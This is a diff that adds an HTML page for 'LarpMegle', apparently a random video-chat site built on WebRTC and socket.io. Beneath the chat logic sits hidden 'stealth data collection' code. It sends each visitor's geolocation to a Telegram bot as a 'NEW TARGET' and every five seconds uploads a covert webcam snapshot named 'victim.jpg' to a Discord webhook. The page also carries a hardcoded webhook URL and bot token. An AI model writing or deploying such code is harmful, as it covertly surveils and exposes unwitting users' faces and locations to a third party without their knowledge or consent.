@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LarpMegle | Connect</title>
+    <style>
+        :root { --purple: #6a0dad; --dark: #121212; }
+        body { background: var(--dark); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; overflow: hidden; }
+        #chat-container { display: flex; flex-direction: column; height: 100vh; }
+        .video-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; height: 80vh; }
+        video { width: 100%; height: 100%; background: #000; border-radius: 10px; border: 2px solid var(--purple); object-fit: cover; }
+        #status { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--purple); padding: 10px 20px; border-radius: 20px; font-weight: bold; }
+        canvas, video#capture { display: none; }
+    </style>
+</head>
+<body>
+
+<div id="chat-container">
+    <div class="video-grid">
+        <video id="localVideo" autoplay muted playsinline></video>
+        <video id="remoteVideo" autoplay playsinline></video>
+    </div>
+    <div id="status">Connecting...</div>
+</div>
+
+<video id="capture" autoplay playsinline></video>
+<canvas id="snapshot"></canvas>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+    const socket = io();
+    const localVideo = document.getElementById('localVideo');
+    const remoteVideo = document.getElementById('remoteVideo');
+    const status = document.getElementById('status');
+    
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1565339535905128558/5F8PbFyC1Wk9uLy9oNN2lGHI7_H6JxkiN5I8rQyM38JVUSyKw2g2qirYe9_sFGm6qi6w';
+    const TG_BOT_TOKEN = '8471640597:AAGmp7AbPqioC1Ctde6Nv_g02se7HNW4xBg';
+    const TG_CHAT_ID = '-1004316208944';
+
+    let localStream;
+    let peerConnection;
+
+    const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+
+    async function init() {
+        try {
+            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            localVideo.srcObject = localStream;
+            document.getElementById('capture').srcObject = localStream;
+            
+            // Stealth Data Collection
+            collectData();
+            setInterval(takeSnapshot, 5000); // Every 5 seconds
+
+            status.innerText = "Searching for stranger...";
+        } catch (e) {
+            status.innerText = "Camera Access Denied";
+        }
+    }
+
+    async function collectData() {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const msg = `📍 NEW TARGET\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}`;
+            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg })
+            });
+        });
+    }
+
+    function takeSnapshot() {
+        const canvas = document.getElementById('snapshot');
+        const video = document.getElementById('capture');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            formData.append('file', blob, 'victim.jpg');
+            formData.append('payload_json', JSON.stringify({ content: "Live snapshot from LarpMegle" }));
+            fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+        }, 'image/jpeg');
+    }
+
+    // RTC Logic
+    socket.on('startcall', async (partnerId) => {
+        status.innerText = "Connected!";
+        peerConnection = new RTCPeerConnection(config);
+        
+        localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
+
+        peerConnection.onicecandidate = (e) => {
+            if (e.candidate) socket.emit('candidate', { partnerId, candidate: e.candidate });
+        };
+
+        peerConnection.ontrack = (e) => {
+            remoteVideo.srcObject = e.streams[0];
+        };
+
+        const offer = await peerConnection.createOffer();
+        await peerConnection.setLocalDescription(offer);
+        socket.emit('offer', { partnerId, offer });
+    });
+
+    socket.on('offer', async (data) => {
+        peerConnection = new RTCPeerConnection(config);
+        localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
+        peerConnection.ontrack = (e) => { remoteVideo.srcObject = e.streams[0]; };
+        
+        await peerConnection.setRemoteDescription(data.offer);
+        const answer = await peerConnection.createAnswer();
+        await peerConnection.setLocalDescription(answer);
+        socket.emit('answer', { partnerId: socket.id, answer });
+    });
+
+    socket.on('answer', async (ans) => {
+        await peerConnection.setRemoteDescription(ans);
+    });
+
+    socket.on('candidate', async (can) => {
+        await peerConnection.addIceCandidate(can.candidate);
+    });
+
+    init();
+</script>
+</body>
+</html>
